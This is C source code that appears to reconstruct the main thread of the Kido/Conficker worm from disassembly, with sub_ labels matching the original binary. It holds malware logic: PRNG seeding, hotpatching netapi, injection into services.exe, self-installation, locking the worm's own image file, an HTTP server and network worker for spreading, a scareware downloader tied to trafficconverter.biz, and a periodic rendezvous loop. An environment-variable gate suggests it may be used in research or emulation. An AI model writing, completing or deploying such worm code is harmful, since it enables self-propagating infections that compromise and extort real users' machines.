/*====================================================================================
 *  KIDO worm - main thread (sub_06847) and supporting host helpers.
 *  Flow (kido_program_flow_pseudocode.txt §3.3):
 *    seed PRNG -> [Win2000] inject services.exe -> [not *.dll] self-install
 *    -> read own image + lock -> WSAStartup -> start HTTP server
 *    -> [if server up] geo setup + network worker -> Sleep 30 min
 *    -> scareware downloader -> loop { online? rendezvous + Sleep 3h : Sleep 60s }
 *====================================================================================*/
#include "kido_worm.h"
#include "kido_trace.h"
#include <stdio.h>
#include <time.h>

/* ---------------- seed_prng (sub_07F51) ----------------
   Seed the C PRNG from thread id, process id, perf counter, tick count. */
void kido_seed_prng(void)
{
    LARGE_INTEGER pc; QueryPerformanceCounter(&pc);
    DWORD pid = GetCurrentProcessId();
    DWORD tid = GetCurrentThreadId();
    DWORD tick = GetTickCount();
    srand((unsigned)((pc.QuadPart & 0xFFFFFFFF) ^ (pid<<16) ^ (tid<<8) ^ tick));
}

/* ---------------- volume serial (sub_07D84) ----------------
   GetVolumeInformationA on the system drive; used to reseed PRNG for the
   HTTP port sequence (stable per machine). */
DWORD kido_volume_serial(void)
{
    DWORD serial = 0, maxlen = 0, flags = 0;
    char vol[64]={0}, fs[16]={0};
    GetVolumeInformationA("C:\\", vol, sizeof(vol), &serial, &maxlen, &flags, fs, sizeof(fs));
    return serial;
}

/* ---------------- read own image + lock (sub_08119 + step 4) -------------
   Read the on-disk wrapper file into memory, note where the PE image ends
   (overlay = bytes beyond the last section), and lock the file. */
void kido_read_own_image(void)
{
    HANDLE h = CreateFileA(g_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD size = GetFileSize(h, NULL);
    if (size == 0 || size == INVALID_FILE_SIZE){ CloseHandle(h); return; }
    uint8_t* img = (uint8_t*)malloc(size);
    if (!img){ CloseHandle(h); return; }
    DWORD got = 0;
    ReadFile(h, img, size, &got, NULL);

    /* find end of PE image (last section raw end) */
    size_t overlay = size;
    if (got >= 0x40 && img[0]=='M' && img[1]=='Z'){
        DWORD e_lfanew = *(const DWORD*)(img+0x3C);
        if (e_lfanew + 4 + 20 < got && *(const DWORD*)(img+e_lfanew)==0x00004550){
            const IMAGE_NT_HEADERS32* nt = (const IMAGE_NT_HEADERS32*)(img+e_lfanew);
            const IMAGE_SECTION_HEADER* s = IMAGE_FIRST_SECTION(nt);
            for (WORD i=0;i<nt->FileHeader.NumberOfSections;i++){
                size_t end = s->PointerToRawData + s->SizeOfRawData;
                if (end > overlay) overlay = end;
            }
        }
    }
    g_image = img;
    g_image_len = got;
    g_image_overlay_off = overlay;

    /* keep the file locked for the worm's lifetime */
    LockFile(h, 0, 0, size, 0);
    g_file_lock = h;   /* do not close while running */
}

/* ---------------- main thread (sub_06847) ---------------- */
DWORD WINAPI kido_main_thread(LPVOID)
{
    (void)0;
    AddVectoredExceptionHandler(1, kido_worm_veh);
    kido_trace("main_thread START");
    kido_seed_prng();
    kido_hotpatch_netapi();
    kido_trace("seed+hotpatch done");
    if (LOWORD(GetVersion()) == 5 && HIWORD(GetVersion()) == 0)
        kido_inject_services_exe();
    if (!kido_path_ends_with_dll(g_path)) kido_self_install();
    kido_read_own_image();
    kido_trace("self_image read");

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0){ kido_trace("WSAStartup FAIL"); return 0; }
    kido_trace("WSAStartup ok");
    int lang = kido_os_language_from_ntdll();
    g_lang = (uint8_t)(lang ? lang : 9);
    int port = kido_http_server_start();
    int nonet = (GetEnvironmentVariableA("KIDO_NONET", NULL, 0) != 0);   /* test gate */
    if (port > 0 && !nonet){
        kido_geo_database_setup();
        CreateThread(NULL, 0, kido_network_worker, NULL, 0, NULL);
    }

    /* 30 minutes */
    Sleep(30 * 60 * 1000);

    /* scareware downloader (trafficconverter.biz) */
    if (!nonet) CreateThread(NULL, 0, kido_scareware_downloader, NULL, 0, NULL);

    /* rendezvous loop */
    for (;;){
        DWORD flags = 0;
        if (InternetGetConnectedState(&flags, 0)){
            CreateThread(NULL, 0, kido_rendezvous_round, NULL, 0, NULL);
            Sleep(3 * 60 * 60 * 1000);       /* 3 hours */
        } else {
            Sleep(60 * 1000);                 /* 60 s */
        }
    }
    return 0;
}
